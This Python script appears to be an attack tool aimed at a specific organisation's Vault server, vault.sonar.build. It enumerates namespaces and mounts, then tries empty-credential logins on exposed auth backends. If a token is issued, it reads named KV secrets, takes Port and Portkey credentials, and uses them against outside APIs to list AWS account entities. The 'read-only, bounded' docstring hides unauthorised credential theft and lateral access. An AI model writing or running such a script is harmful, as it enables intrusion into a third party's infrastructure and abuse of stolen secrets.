#!/usr/bin/env python3
"""Read-only Vault NAMESPACE / nested-mount enumeration on vault.sonar.build (intent 12052).

Runs ONLY on a GitHub-hosted runner of our own throwaway repo (cballk/fabric-oidc-10548).
Strictly read-only and bounded:
  - GET /v1/sys/health (1)
  - GET /v1/sys/internal/ui/mounts (root control) (1)
  - GET /v1/sys/internal/ui/mounts with X-Vault-Namespace: development | operations |
        operations/team/re | operations/team/re/kv (4)
  - GET /v1/sys/internal/ui/mounts/<path> for development/kv, operations/team/re/kv,
        development/github (3)  + kv under ns=development, kv under ns=operations/team/re (2)
  - GET /v1/sys/internal/ui/namespaces (1)
  total <= 12 GETs.
Then: for any non-github auth mount exposed, at most ONE minimal login each, global <=10:
  explicit no-credential payloads only ({} / empty password / empty jwt / role=default);
  aws-iam gets exactly one empty POST (no forged sig). No brute force, no role enumeration,
  no password injection. If (unexpectedly) a client_token is issued: lookup-self,
  capabilities-self, then at most ONE exact KV read per known path and <=1 minimal read-only
  validation of a real credential. Secrets never printed in plaintext (first4/last4 only).
"""
import base64
import json
import os
import socket
import sys
import time
import urllib.error
import urllib.parse
import urllib.request

BASE = "https://vault.sonar.build"
RESULT = {"probe": "vault-namespace-enum-12052"}
GET_COUNT = 0
LOGIN_COUNT = 0
MAX_LOGINS = 10


def log(*a):
    print(*a, flush=True)


def mask(v):
    if v is None:
        return None
    v = str(v)
    if len(v) <= 8:
        return "****"
    return v[:4] + "****" + v[-4:] + f" (len={len(v)})"


def http(method, url, data=None, headers=None, timeout=25, maxbody=400000):
    h = {"User-Agent": "vault-ns-probe/1.0"}
    if headers:
        h.update(headers)
    body = None
    if data is not None:
        body = json.dumps(data).encode()
        h.setdefault("Content-Type", "application/json")
    req = urllib.request.Request(url, data=body, headers=h, method=method)
    t0 = time.time()
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            raw = r.read(maxbody)
            return {"status": r.status, "ms": int((time.time() - t0) * 1000),
                    "headers": dict(r.headers), "body": raw}
    except urllib.error.HTTPError as e:
        raw = e.read(maxbody)
        return {"status": e.code, "ms": int((time.time() - t0) * 1000),
                "headers": dict(e.headers or {}), "body": raw}
    except Exception as e:
        return {"status": None, "ms": int((time.time() - t0) * 1000),
                "error": f"{type(e).__name__}: {str(e)[:250]}"}


def jbody(r, n=6000):
    try:
        return json.loads(r["body"].decode("utf-8", "replace")) if r.get("body") else None
    except Exception:
        return {"_raw": (r.get("body") or b"")[:n].decode("utf-8", "replace")}


def errs(j):
    if isinstance(j, dict):
        if isinstance(j.get("errors"), list):
            return "; ".join(str(x) for x in j["errors"])[:800]
        if "error" in j:
            return str(j["error"])[:800]
        return json.dumps(j)[:800]
    return str(j)[:800]


def summarize_mounts(r):
    j = jbody(r)
    out = {"status": r["status"], "ms": r["ms"], "error": r.get("error")}
    if isinstance(j, dict) and isinstance(j.get("data"), dict):
        d = j["data"]
        auth, secret = {}, {}
        for k, v in (d.get("auth") or {}).items():
            if isinstance(v, dict):
                auth[k] = {"type": v.get("type"), "description": v.get("description"),
                           "options": v.get("options"), "default_lease": v.get("default_lease_ttl"),
                           "max_lease": v.get("max_lease_ttl")}
        for k, v in (d.get("secret") or {}).items():
            if isinstance(v, dict):
                secret[k] = {"type": v.get("type"), "description": v.get("description"),
                             "options": v.get("options")}
        out["auth"] = auth
        out["secret"] = secret
        out["auth_keys"] = sorted(auth.keys())
        out["secret_keys"] = sorted(secret.keys())
        # drop bulky nested config our summary already covers
        if "auth" in out:
            out["data_other_keys"] = [k for k in d.keys() if k not in ("auth", "secret")]
    else:
        out["resp"] = errs(j) if j is not None else (r.get("body") or b"")[:400].decode("utf-8", "replace")
    return out


def get_ui_mounts(ns=None, path=None, label=""):
    global GET_COUNT
    if GET_COUNT >= 16:
        return {"label": label, "skipped": "GET budget exhausted"}
    GET_COUNT += 1
    url = BASE + "/v1/sys/internal/ui/mounts" + (("/" + path) if path else "")
    hd = {"X-Vault-Request": "true", "Accept": "application/json"}
    if ns:
        hd["X-Vault-Namespace"] = ns
    r = http("GET", url, headers=hd, timeout=20)
    s = summarize_mounts(r)
    s.update({"label": label or (f"ns={ns} path={path}"), "namespace_sent": ns, "path": path,
              "url_path": "/v1/sys/internal/ui/mounts" + (("/" + path) if path else "")})
    return s


def do_login(mount, payload, label, ns=None):
    global LOGIN_COUNT
    if LOGIN_COUNT >= MAX_LOGINS:
        return {"label": label, "skipped": "login budget exhausted"}
    LOGIN_COUNT += 1
    hd = {}
    if ns:
        hd["X-Vault-Namespace"] = ns
    r = http("POST", f"{BASE}/v1/auth/{mount}/login", data=payload, headers=hd, timeout=20)
    j = jbody(r)
    out = {"label": label, "mount": mount, "namespace_sent": ns,
           "url_path": f"/v1/auth/{mount}/login", "payload_keys": sorted(payload.keys()),
           "status": r["status"], "ms": r["ms"], "error": r.get("error")}
    if isinstance(j, dict):
        if isinstance(j.get("auth"), dict):
            a = j["auth"]
            out["issued"] = True
            out["token_present"] = bool(a.get("client_token"))
            out["policies"] = a.get("policies")
            out["token_ttl"] = a.get("lease_duration")
            if a.get("client_token"):
                out["_client_token"] = a["client_token"]
        else:
            out["resp"] = errs(j)
    elif r.get("body"):
        out["raw"] = (r.get("body") or b"")[:300].decode("utf-8", "replace")
    return out


def deep_read(token, ns=None):
    H = {"X-Vault-Token": token}
    if ns:
        H["X-Vault-Namespace"] = ns
    cont = {}
    paths = ["operations/team/re/kv/data/port",
             "development/kv/data/code-security-diff-val-claude-code"]
    cap = http("POST", BASE + "/v1/sys/capabilities-self", data={"paths": paths}, headers=H, timeout=20)
    cj = jbody(cap)
    cont["capabilities_self"] = {"status": cap["status"], "json": cj}
    caps = {}
    try:
        for k, v in (cj.get("data") or cj.get("capabilities") or {}).items():
            caps[k] = v
    except Exception:
        pass
    lk = http("GET", BASE + "/v1/auth/token/lookup-self", headers=H, timeout=20)
    lj = jbody(lk)
    if isinstance(lj, dict) and isinstance(lj.get("data"), dict):
        lj = {"data": {k: lj["data"].get(k) for k in ("display_name", "policies", "ttl",
                                                      "identity_policies", "meta")}}
    cont["lookup_self"] = {"status": lk["status"], "json": lj}
    kv = {}
    for path in paths:
        allowed = None
        for k, v in caps.items():
            if k == path:
                allowed = "read" in (v or [])
        if allowed is False:
            kv[path] = {"skipped": "capabilities-self says no read"}
            continue
        r = http("GET", f"{BASE}/v1/{path}", headers=H, timeout=20)
        j = jbody(r)
        item = {"status": r["status"], "ms": r["ms"], "error": r.get("error")}
        if isinstance(j, dict) and isinstance(j.get("data"), dict):
            d = j["data"].get("data") if isinstance(j["data"].get("data"), dict) else j["data"]
            if isinstance(d, dict):
                item["keys"] = sorted(d.keys())[:20]
                item["masked"] = {k: (mask(v) if isinstance(v, str) else "<non-str>") for k, v in d.items()}
                if path.endswith("/port"):
                    if d.get("clientId") or d.get("clientSecret"):
                        cont["_port"] = (d.get("clientId"), d.get("clientSecret"))
                if d.get("portkey-api-key"):
                    cont["_portkey"] = d["portkey-api-key"]
        kv[path] = item
    cont["kv_read"] = kv
    return cont


def main():
    # egress + dns
    egress = {}
    for name, u in (("ipify", "https://api.ipify.org?format=json"),):
        r = http("GET", u, timeout=15)
        egress[name] = {"status": r["status"], "body": jbody(r, 300) if r["status"] == 200 else r.get("error")}
    RESULT["egress"] = egress
    try:
        ips = sorted({i[4][0] for i in socket.getaddrinfo("vault.sonar.build", 443, proto=socket.IPPROTO_TCP)})
    except Exception as e:
        ips = [f"err {type(e).__name__}: {str(e)[:150]}"]
    RESULT["dns_vault"] = ips

    # 1) health control
    r = http("GET", BASE + "/v1/sys/health?standbyok=true&perfstandbyok=true&sealedcode=200&uninitcode=200", timeout=25)
    hj = jbody(r)
    RESULT["sys_health"] = {"status": r["status"], "ms": r["ms"], "error": r.get("error"),
                            "json": hj if isinstance(hj, dict) else None}

    # 2) mount enumeration matrix
    mounts = []
    mounts.append(get_ui_mounts(None, None, "root-control"))
    mounts.append(get_ui_mounts("development", None, "ns=development list"))
    mounts.append(get_ui_mounts("operations", None, "ns=operations list"))
    mounts.append(get_ui_mounts("operations/team/re", None, "ns=operations/team/re list"))
    mounts.append(get_ui_mounts("operations/team/re/kv", None, "ns=operations/team/re/kv list"))
    mounts.append(get_ui_mounts(None, "development/kv", "path=development/kv"))
    mounts.append(get_ui_mounts(None, "operations/team/re/kv", "path=operations/team/re/kv"))
    mounts.append(get_ui_mounts(None, "development/github", "path=development/github"))
    mounts.append(get_ui_mounts("development", "kv", "ns=development path=kv"))
    mounts.append(get_ui_mounts("operations/team/re", "kv", "ns=operations/team/re path=kv"))
    # 3) namespaces endpoint
    r = http("GET", BASE + "/v1/sys/internal/ui/namespaces", headers={"X-Vault-Request": "true"}, timeout=20)
    nj = jbody(r)
    RESULT["ui_namespaces"] = {"status": r["status"], "ms": r["ms"], "error": r.get("error"),
                               "resp": errs(nj) if nj is not None else None}
    RESULT["ui_mounts_matrix"] = mounts

    # 3b) also try /v1/sys/namespaces (needs sudo; records 403 vs 404)
    r = http("GET", BASE + "/v1/sys/namespaces", headers={"X-Vault-Request": "true"}, timeout=20)
    RESULT["sys_namespaces"] = {"status": r["status"], "ms": r["ms"], "error": r.get("error"),
                                "resp": errs(jbody(r)) if r.get("body") else None}

    # 4) find exposed non-github auth mounts -> one minimal login each
    exposed = {}  # (ns, path, type)
    for m in mounts:
        if m.get("status") != 200:
            continue
        ns = m.get("namespace_sent")
        for k, v in (m.get("auth") or {}).items():
            p = k.rstrip("/")
            exposed[(ns, p, v.get("type"))] = v
    RESULT["exposed_auth_mounts"] = [{"namespace": ns, "path": p, "type": t,
                                      "description": (v or {}).get("description")}
                                     for (ns, p, t), v in exposed.items()]

    logins = []
    seen = set()
    # aws-iam first (one empty POST, no forged signature)
    for (ns, p, t), v in exposed.items():
        if t == "aws-iam" or p == "aws-iam":
            logins.append(do_login(p, {}, f"aws-iam:empty({p},ns={ns})", ns))
            seen.add((ns, p))
    for (ns, p, t), v in exposed.items():
        if (ns, p) in seen:
            continue
        if "github" in p or t in ("github", "jwt", "jwt-ghwf"):
            continue  # already exhaustively tested in 11952/11914/11995
        if t == "token":
            LOGIN_COUNT_GUARD = True  # token lookup with empty token -> 403
            logins.append({"label": f"token:lookup-self-empty(ns={ns})", "mount": p,
                           "namespace_sent": ns, "status": None, "note": "skipped by policy"})
            continue
        payload = {}
        label = f"{t}:empty({p},ns={ns})"
        if t == "userpass" or t == "ldap":
            payload = {"password": ""}
            # still a no-credential probe (empty password); no injection of guesses
        elif t == "kubernetes" or t == "jwt" or t == "oidc":
            payload = {"jwt": ""}
        elif t == "approle":
            payload = {"role_id": ""}
        logins.append(do_login(p, payload, label, ns))
        seen.add((ns, p))
        if LOGIN_COUNT >= MAX_LOGINS:
            break
    RESULT["logins"] = logins

    # 5) unexpected token issuance -> deep read
    issued = None
    issued_ns = None
    for it in logins:
        if isinstance(it, dict) and it.get("_client_token"):
            issued = it.pop("_client_token")
            issued_ns = it.get("namespace_sent")
            break
    if issued:
        cont = deep_read(issued, issued_ns)
        pkey = cont.pop("_portkey", None)
        pcli = cont.pop("_port", None)
        RESULT["deep_read"] = cont
        if pkey:
            v = http("GET", "https://api.portkey.ai/v1/models", headers={"x-portkey-api-key": pkey}, timeout=25)
            vj = jbody(v)
            n = len(vj.get("data") or []) if isinstance(vj, dict) and isinstance(vj.get("data"), list) else None
            RESULT["portkey_validate"] = {"status": v["status"], "ms": v["ms"], "model_count": n,
                                          "error": None if v["status"] == 200 else vj}
        if pcli and pcli[0] and pcli[1]:
            # single POST to Port auth endpoint
            body = json.dumps({"clientId": pcli[0], "clientSecret": pcli[1]}).encode()
            req = urllib.request.Request("https://api.port.io/v1/auth/access_token", data=body,
                                         headers={"Content-Type": "application/json",
                                                  "User-Agent": "ns-probe/1.0"}, method="POST")
            try:
                with urllib.request.urlopen(req, timeout=25) as rr:
                    pj = json.loads(rr.read(200000).decode() or "{}")
                    st = rr.status
            except urllib.error.HTTPError as e:
                st = e.code
                try:
                    pj = json.loads(e.read(200000).decode() or "{}")
                except Exception:
                    pj = {}
            except Exception as e:
                st = None
                pj = {"error": f"{type(e).__name__}: {str(e)[:200]}"}
            tok = pj.get("accessToken") if isinstance(pj, dict) else None
            RESULT["port_token"] = {"status": st, "token_present": bool(tok),
                                    "token_masked": mask(tok) if tok else None}
            if tok:
                for bp in ("aws_account", "aws_organisational_unit"):
                    r2 = http("GET", f"https://api.port.io/v1/blueprints/{bp}/entities",
                              headers={"Authorization": "Bearer " + tok}, timeout=25)
                    bj = jbody(r2)
                    cnt = None
                    if isinstance(bj, dict):
                        ents = bj.get("entities")
                        if isinstance(ents, list):
                            cnt = len(ents)
                            sample = []
                            for e in ents[:3]:
                                if isinstance(e, dict):
                                    ident = e.get("identifier")
                                    props = e.get("properties") or {}
                                    sample.append({"identifier": ident,
                                                   "prop_keys": sorted(props.keys())[:15] if isinstance(props, dict) else None})
                            RESULT.setdefault("port_entities", {})[bp] = {
                                "status": r2["status"], "count": cnt, "sample": sample}
                            continue
                    RESULT.setdefault("port_entities", {})[bp] = {"status": r2["status"], "resp": errs(bj)}
    else:
        RESULT["deep_read"] = None

    log("===RESULT_JSON_START===")
    log(json.dumps(RESULT, indent=1, default=str))
    log("===RESULT_JSON_END===")
    log(f"budget: GET_COUNT={GET_COUNT} LOGIN_COUNT={LOGIN_COUNT}")


if __name__ == "__main__":
    main()
